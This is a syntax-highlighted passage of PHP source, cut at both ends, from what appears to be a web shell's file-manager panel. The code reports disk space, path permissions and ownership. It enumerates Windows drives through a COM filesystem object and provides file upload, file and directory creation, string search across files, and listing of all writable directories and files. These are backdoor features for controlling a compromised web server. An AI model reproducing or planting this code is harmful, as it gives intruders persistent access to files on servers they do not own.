<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'opfile'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'dir'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfoot(</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'getsize'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'getdir'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'dir'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfoot(</span>);

<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">free</span> = @<span style="color: #eaeaea; background-color: #000000;">disk_free_space(</span>$<span style="color: #e7c547;">nowpath</span>);
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">free</span> &amp;&amp; $<span style="color: #e7c547;">free</span> = <span style="color: #eaeaea; background-color: #000000;">0</span>;
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">all</span> = @<span style="color: #eaeaea; background-color: #000000;">disk_total_space(</span>$<span style="color: #e7c547;">nowpath</span>);
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">all</span> &amp;&amp; $<span style="color: #e7c547;">all</span> = <span style="color: #eaeaea; background-color: #000000;">0</span>;
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">used</span> = $<span style="color: #e7c547;">all</span>-$<span style="color: #e7c547;">free</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;h2&gt;File Manager - Current disk free '</span>.<span style="color: #eaeaea; background-color: #000000;">sizecount(</span>$<span style="color: #e7c547;">free</span>).<span style="color: #70c0b1;">' of '</span>.<span style="color: #eaeaea; background-color: #000000;">sizecount(</span><span style="text-decoration: underline;">$</span><span style="color: #e7c547; text-decoration: underline;">all</span><span style="text-decoration: underline;">).</span><span style="color: #70c0b1; text-decoration: underline;">' ('</span><span style="text-decoration: underline;">.@</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">round(100</span><span style="text-decoration: underline;">/($</span><span style="color: #e7c547; text-decoration: underline;">all</span><span style="text-decoration: underline;">/$</span><span style="color: #e7c547; text-decoration: underline;">free</span><span style="text-decoration: underline;">),</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">2</span><span style="text-decoration: underline;">).</span><span style="color: #70c0b1; text-decoration: underline;">'%)&lt;/h2&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">cwd_links</span> = <span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">path</span> = <span style="color: #eaeaea; background-color: #000000;">explode(</span><span style="color: #70c0b1;">'/'</span>, $<span style="color: #e7c547;">nowpath</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">n</span>=<span style="color: #eaeaea; background-color: #000000;">count(</span>$<span style="color: #e7c547;">path</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">for</span>($<span style="color: #e7c547;">i</span>=<span style="color: #eaeaea; background-color: #000000;">0</span>;$<span style="color: #e7c547;">i</span>&lt;$<span style="color: #e7c547;">n</span>-<span style="color: #eaeaea; background-color: #000000;">1</span>;$<span style="color: #e7c547;">i</span>++) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">cwd_links</span> .= <span style="color: #70c0b1;">'&lt;a href="javascript:godir(\''</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">for</span>($<span style="color: #e7c547;">j</span>=<span style="color: #eaeaea; background-color: #000000;">0</span>;$<span style="color: #e7c547;">j</span>&lt;=$<span style="color: #e7c547;">i</span>;$<span style="color: #e7c547;">j</span>++) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">cwd_links</span> .= $<span style="color: #e7c547;">path</span>[$<span style="color: #e7c547;">j</span>].<span style="color: #70c0b1;">'/'</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">cwd_links</span> .= <span style="color: #70c0b1;">'\');"&gt;'</span>.$<span style="color: #e7c547;">path</span>[$<span style="color: #e7c547;">i</span>].<span style="color: #70c0b1;">'/&lt;/a&gt;'</span>;
<span style="background-color: #424242;"> </span>   }

<span style="color: #c397d8;">?&gt;</span>
<span style="color: #7aa6da;">&lt;script</span> <span style="color: #7aa6da;">type=</span><span style="color: #70c0b1;">"text/javascript"</span><span style="color: #7aa6da;">&gt;</span>
<span style="color: #d54e53; font-weight: bold;">document</span>.<span style="color: #d54e53; font-weight: bold;">onclick</span> = <span style="color: #d54e53; font-weight: bold;">shownav</span>;
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">shownav</span>(<span style="color: #d54e53; font-weight: bold;">e</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">var</span> <span style="color: #d54e53; font-weight: bold;">src</span> = <span style="color: #d54e53; font-weight: bold;">e</span>?<span style="color: #d54e53; font-weight: bold;">e</span>.<span style="color: #d54e53; font-weight: bold;">target</span>:<span style="color: #d54e53; font-weight: bold;">event</span>.<span style="color: #d54e53; font-weight: bold;">srcElement</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">do</span>{
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #d54e53; font-weight: bold;">src</span>.<span style="color: #d54e53; font-weight: bold;">id</span> ==<span style="color: #70c0b1;">"jumpto"</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'inputnav'</span>).<span style="color: #d54e53; font-weight: bold;">style</span>.<span style="color: #d54e53; font-weight: bold;">display</span> = <span style="color: #70c0b1;">""</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'pathnav'</span>).<span style="color: #d54e53; font-weight: bold;">style</span>.<span style="color: #d54e53; font-weight: bold;">display</span> = <span style="color: #70c0b1;">"none"</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">hidenav();</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #d54e53; font-weight: bold;">src</span>.<span style="color: #d54e53; font-weight: bold;">id</span> ==<span style="color: #70c0b1;">"inputnav"</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #d54e53; font-weight: bold;">src</span> = <span style="color: #d54e53; font-weight: bold;">src</span>.<span style="color: #d54e53; font-weight: bold;">parentNode</span>;
<span style="background-color: #424242;"> </span>   }<span style="color: #b9ca4a;">while</span>(<span style="color: #d54e53; font-weight: bold;">src</span>.<span style="color: #d54e53; font-weight: bold;">parentNode</span>)

<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'inputnav'</span>).<span style="color: #d54e53; font-weight: bold;">style</span>.<span style="color: #d54e53; font-weight: bold;">display</span> = <span style="color: #70c0b1;">"none"</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">$(</span><span style="color: #70c0b1;">'pathnav'</span>).<span style="color: #d54e53; font-weight: bold;">style</span>.<span style="color: #d54e53; font-weight: bold;">display</span> = <span style="color: #70c0b1;">""</span>;
}
<span style="color: #7aa6da;">&lt;/script&gt;</span>
<span style="color: #7aa6da;">&lt;div</span> <span style="color: #7aa6da;">style=</span><span style="color: #70c0b1;">"background:#eee;margin-bottom:10px;"</span><span style="color: #7aa6da;">&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;table</span> <span style="color: #7aa6da;">id=</span><span style="color: #70c0b1;">"pathnav"</span> <span style="color: #7aa6da;">width=</span><span style="color: #70c0b1;">"100%"</span> <span style="color: #7aa6da;">border=</span><span style="color: #70c0b1;">"0"</span> <span style="color: #7aa6da;">cellpadding=</span><span style="color: #70c0b1;">"5"</span> <span style="color: #7aa6da;">cellspacing=</span><span style="color: #70c0b1;">"0"</span><span style="color: #7aa6da;">&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;tr&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;td</span> <span style="color: #7aa6da;">width=</span><span style="color: #70c0b1;">"100%"</span><span style="color: #7aa6da;">&gt;</span><span style="color: #c397d8;">&lt;?php</span> <span style="color: #b9ca4a;">echo</span> $<span style="color: #e7c547;">cwd_links</span>.<span style="color: #70c0b1;">' - '</span>.<span style="color: #eaeaea; background-color: #000000;">getChmod(</span>$<span style="color: #e7c547;">nowpath</span>).<span style="color: #70c0b1;">' / </span><span style="color: #70c0b1; text-decoration: underline;">'</span><span style="text-decoration: underline;">.</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">getPerms(</span><span style="text-decoration: underline;">$</span><span style="color: #e7c547; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">).</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">getUser(</span><span style="text-decoration: underline;">$</span><span style="color: #e7c547; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">);</span><span style="color: #c397d8; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;"> (</span><span style="color: #c397d8; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #b9ca4a; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> $</span><span style="color: #e7c547; text-decoration: underline;">dir_writeable</span><span style="text-decoration: underline;">;</span><span style="color: #c397d8; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">)</span><span style="color: #7aa6da; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;td</span> <span style="color: #d54e53; font-weight: bold;">nowrap</span><span style="color: #7aa6da;">&gt;&lt;input</span> <span style="color: #7aa6da;">class=</span><span style="color: #70c0b1;">"bt"</span> <span style="color: #7aa6da;">id=</span><span style="color: #70c0b1;">"jumpto"</span> <span style="color: #7aa6da;">name=</span><span style="color: #70c0b1;">"jumpto"</span> <span style="color: #7aa6da;">value=</span><span style="color: #70c0b1;">"Jump t</span><span style="color: #70c0b1; text-decoration: underline;">o"</span><span style="text-decoration: underline;"> </span><span style="color: #7aa6da; text-decoration: underline;">type=</span><span style="color: #70c0b1; text-decoration: underline;">"button"</span><span style="color: #7aa6da; text-decoration: underline;">&gt;&lt;/td&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;/tr&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;/table&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;table</span> <span style="color: #7aa6da;">id=</span><span style="color: #70c0b1;">"inputnav"</span> <span style="color: #7aa6da;">width=</span><span style="color: #70c0b1;">"100%"</span> <span style="color: #7aa6da;">border=</span><span style="color: #70c0b1;">"0"</span> <span style="color: #7aa6da;">cellpadding=</span><span style="color: #70c0b1;">"5"</span> <span style="color: #7aa6da;">cellspacing=</span><span style="color: #70c0b1;">"0"</span><span style="text-decoration: underline;"> </span><span style="color: #7aa6da; text-decoration: underline;">style=</span><span style="color: #70c0b1; text-decoration: underline;">"display:none;"</span><span style="color: #7aa6da; text-decoration: underline;">&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;form</span> <span style="color: #7aa6da;">action=</span><span style="color: #70c0b1;">""</span> <span style="color: #7aa6da;">method=</span><span style="color: #70c0b1;">"post"</span> <span style="color: #7aa6da;">id=</span><span style="color: #70c0b1;">"godir"</span> <span style="color: #7aa6da;">name=</span><span style="color: #70c0b1;">"godir"</span><span style="color: #7aa6da;">&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;tr&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;td</span> <span style="color: #d54e53; font-weight: bold;">nowrap</span><span style="color: #7aa6da;">&gt;</span><span style="color: #d54e53; font-weight: bold;">Current</span> <span style="color: #eaeaea; background-color: #000000;">Directory (</span><span style="color: #c397d8;">&lt;?php</span> <span style="color: #b9ca4a;">echo</span> $<span style="color: #e7c547;">dir_writeable</span>;<span style="color: #c397d8;">?&gt;</span>, <span style="color: #c397d8;">&lt;?php</span> <span style="color: #b9ca4a;">ec</span><span style="color: #b9ca4a; text-decoration: underline;">ho</span><span style="text-decoration: underline;"> </span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">getChmod(</span><span style="text-decoration: underline;">$</span><span style="color: #e7c547; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">);</span><span style="color: #c397d8; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">)</span><span style="color: #7aa6da; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;td</span> <span style="color: #7aa6da;">width=</span><span style="color: #70c0b1;">"100%"</span><span style="color: #7aa6da;">&gt;&lt;input</span> <span style="color: #7aa6da;">name=</span><span style="color: #70c0b1;">"view_writable"</span> <span style="color: #7aa6da;">value=</span><span style="color: #70c0b1;">"0"</span> <span style="color: #7aa6da;">type=</span><span style="color: #70c0b1;">"hidden"</span><span style="text-decoration: underline;"> /</span><span style="color: #7aa6da; text-decoration: underline;">&gt;&lt;input</span><span style="text-decoration: underline;"> </span><span style="color: #7aa6da; text-decoration: underline;">class=</span><span style="color: #70c0b1; text-decoration: underline;">"input"</span><span style="text-decoration: underline;"> </span><span style="color: #7aa6da; text-decoration: underline;">name=</span><span style="color: #70c0b1; text-decoration: underline;">"dir"</span><span style="text-decoration: underline;"> </span><span style="color: #7aa6da; text-decoration: underline;">value=</span><span style="color: #70c0b1; text-decoration: underline;">"&lt;?php echo $nowpath;?&gt;"</span><span style="text-decoration: underline;"> </span><span style="color: #7aa6da; text-decoration: underline;">type=</span><span style="color: #70c0b1; text-decoration: underline;">"text"</span><span style="text-decoration: underline;"> </span><span style="color: #7aa6da; text-decoration: underline;">style=</span><span style="color: #70c0b1; text-decoration: underline;">"width:99%;margin:0 8px;"</span><span style="text-decoration: underline;">&gt;</span><span style="color: #7aa6da; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;td</span> <span style="color: #d54e53; font-weight: bold;">nowrap</span><span style="color: #7aa6da;">&gt;&lt;input</span> <span style="color: #7aa6da;">class=</span><span style="color: #70c0b1;">"bt"</span> <span style="color: #7aa6da;">value=</span><span style="color: #70c0b1;">"GO"</span> <span style="color: #7aa6da;">type=</span><span style="color: #70c0b1;">"submit"</span><span style="color: #7aa6da;">&gt;&lt;/td&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;/tr&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;/form&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;/table&gt;</span>
<span style="color: #c397d8;">&lt;?php</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #d54e53; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #d54e53; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">obj</span> = <span style="color: #b9ca4a;">new</span> <span style="color: #7aa6da;">COM</span>(<span style="color: #70c0b1;">'scripting.filesystemobject'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">obj</span> &amp;&amp; <span style="color: #eaeaea; background-color: #000000;">is_object(</span>$<span style="color: #e7c547;">obj</span>) &amp;&amp; $<span style="color: #e7c547;">obj</span>-<span style="color: #7aa6da;">&gt;</span><span style="color: #e7c547;">Drives</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">echo</span> <span style="color: #70c0b1;">'&lt;div class="drives"&gt;'</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">DriveTypeDB</span> = <span style="color: #eaeaea; background-color: #000000;">array(0</span> =&gt; <span style="color: #70c0b1;">'Unknow'</span>,<span style="color: #eaeaea; background-color: #000000;">1</span> =&gt; <span style="color: #70c0b1;">'Removable'</span>,<span style="color: #eaeaea; background-color: #000000;">2</span> =&gt; <span style="color: #70c0b1;">'Fixed'</span>,<span style="color: #eaeaea; background-color: #000000;">3</span> =<span style="text-decoration: underline;">&gt; </span><span style="color: #70c0b1; text-decoration: underline;">'Network'</span><span style="text-decoration: underline;">,</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">4</span><span style="text-decoration: underline;"> =&gt; </span><span style="color: #70c0b1; text-decoration: underline;">'CDRom'</span><span style="text-decoration: underline;">,</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">5</span><span style="text-decoration: underline;"> =&gt; </span><span style="color: #70c0b1; text-decoration: underline;">'RAM Disk'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">comma</span> = <span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span>($<span style="color: #e7c547;">obj</span>-&gt;<span style="color: #e7c547;">Drives</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">drive</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">drive</span>-&gt;<span style="color: #e7c547;">Path</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span>$<span style="color: #e7c547;">comma</span>.<span style="color: #70c0b1;">'&lt;a href="javascript:godir(\''</span>.$<span style="color: #e7c547;">drive</span>-<span style="color: #7aa6da;">&gt;</span><span style="color: #e7c547;">Path</span>.<span style="color: #70c0b1;">'/\');"</span><span style="color: #70c0b1; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">DriveTypeDB</span><span style="text-decoration: underline;">[$</span><span style="color: #e7c547; text-decoration: underline;">drive</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #e7c547; text-decoration: underline;">DriveType</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'('</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">drive</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #e7c547; text-decoration: underline;">Path</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">')&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">comma</span> = <span style="color: #70c0b1;">'&lt;span&gt;|&lt;/span&gt;'</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">echo</span> <span style="color: #70c0b1;">'&lt;/div&gt;'</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }
<span style="color: #c397d8;">?&gt;</span>
<span style="color: #7aa6da;">&lt;/div&gt;</span>
<span style="color: #c397d8;">&lt;?php</span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">findstr</span> = $<span style="color: #7aa6da;">_POST</span>[<span style="color: #70c0b1;">'findstr'</span>];
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">re</span> = $<span style="color: #7aa6da;">_POST</span>[<span style="color: #70c0b1;">'re'</span>];
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">tbhead(</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="alt1"&gt;&lt;td colspan="7" style="padding:5px;line-height:20px;"&gt;'</span>)<span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;form action="'</span>.$<span style="color: #e7c547;">self</span>.<span style="color: #70c0b1;">'" method="POST" enctype="multipart/form-data"&gt;&lt;div</span><span style="color: #70c0b1; text-decoration: underline;"> style="float:right;"&gt;&lt;input class="input" name="uploadfile" value="" type="file" /&gt; &lt;input class="bt" name="doupfile" value="Upload" type="submit" /&gt;&lt;input name="uploaddir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'" type="hidden" /&gt;&lt;input name="dir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'" type="hidden" /&gt;&lt;/div&gt;&lt;/form&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;a href="javascript:godir(\''</span>.$<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">"DOCUMENT_ROOT"</span>].<span style="color: #70c0b1;">'\');"&gt;WebRoot&lt;/a</span><span style="color: #70c0b1; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">' | &lt;a href="javascript:godir(\'.\');"&gt;ScriptPath&lt;/a&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">' | &lt;a href="javascript:godir(\''</span>.$<span style="color: #e7c547;">nowpath</span>.<span style="color: #70c0b1;">'\');"&gt;View All&lt;/a&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">' | View Writable ( &lt;a href="javascript:godir(\''</span>.$<span style="color: #e7c547;">nowpath</span>.<span style="color: #70c0b1;">'\',\'dir\');"&gt;</span><span style="color: #70c0b1; text-decoration: underline;">Directory&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">' | &lt;a href="javascript:godir(\''</span>.$<span style="color: #e7c547;">nowpath</span>.<span style="color: #70c0b1;">'\',\'file\');"&gt;File&lt;/a&gt; )'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">' | &lt;a href="javascript:createdir();"&gt;Create Directory&lt;/a&gt; | &lt;a href="java</span><span style="color: #70c0b1; text-decoration: underline;">script:createfile(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\');"&gt;Create File&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;div style="padding:5px 0;"&gt;&lt;form action="'</span>.$<span style="color: #e7c547;">self</span>.<span style="color: #70c0b1;">'" method="POST"&gt;Find s</span><span style="color: #70c0b1; text-decoration: underline;">tring in files(current folder): &lt;input class="input" name="findstr" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">findstr</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'" type="text" /&gt; &lt;input class="bt" value="Find" type="submit" /&gt; Type: &lt;input class="input" name="writabledb" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">writabledb</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'" type="text" /&gt;&lt;input name="dir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">dir</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'" type="hidden" /&gt; &lt;input name="re" value="1" type="checkbox" '</span><span style="text-decoration: underline;">.($</span><span style="color: #e7c547; text-decoration: underline;">re</span><span style="text-decoration: underline;"> ? </span><span style="color: #70c0b1; text-decoration: underline;">'checked'</span><span style="text-decoration: underline;"> : </span><span style="color: #70c0b1; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #70c0b1; text-decoration: underline;">' /&gt; Regular expressions&lt;/form&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="head"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last mod</span><span style="color: #70c0b1; text-decoration: underline;">ified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#26597;&#30475;&#25152;&#26377;&#21487;&#20889;&#25991;&#20214;&#21644;&#30446;&#24405;</span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirdata</span>=<span style="color: #eaeaea; background-color: #000000;">array(</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span>=<span style="color: #eaeaea; background-color: #000000;">array(</span>);

<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">view_writable</span> == <span style="color: #70c0b1;">'dir'</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dirdata</span> = <span style="color: #eaeaea; background-color: #000000;">GetWDirList(</span>$<span style="color: #e7c547;">nowpath</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span>);
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">view_writable</span> == <span style="color: #70c0b1;">'file'</span>) {
